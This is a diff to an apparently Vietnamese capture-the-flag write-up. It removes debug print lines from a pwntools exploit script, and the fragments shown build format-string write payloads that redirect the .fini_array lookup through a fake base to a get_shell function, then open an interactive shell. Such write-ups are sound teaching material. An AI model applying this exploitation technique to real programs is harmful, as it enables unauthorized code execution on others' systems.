@@ -661,7 +661,6 @@ Một khi chương trình cộng thêm `0x3d90` để đến `.fini_array`, lu�
 	###PREPARE_PAYLOAD#####
 	#######################
 	rw_section=exe.address+0x4048
-	print(hex(rw_section))
 	get_shell=exe.sym['get_shell']
 	data={
 	    (get_shell>>0)&0xffff :rw_section,
@@ -685,7 +684,6 @@ Một khi chương trình cộng thêm `0x3d90` để đến `.fini_array`, lu�
 	#########################
 	####SEND_FAKE_BASE#######
 	#########################
-	
 	fake_base=exe.address+0x4048-0x3d90
 	data2={
 	    (fake_base>>0)&0xffff :base_contain,
@@ -705,8 +703,6 @@ Một khi chương trình cộng thêm `0x3d90` để đến `.fini_array`, lu�
 	
 	p.sendlineafter(b'something: ',payload)
 	p.sendlineafter(b'>',b'y')
-	
-	log.info('fake_base: '+hex(fake_base))
-	
+
 	p.interactive()
 
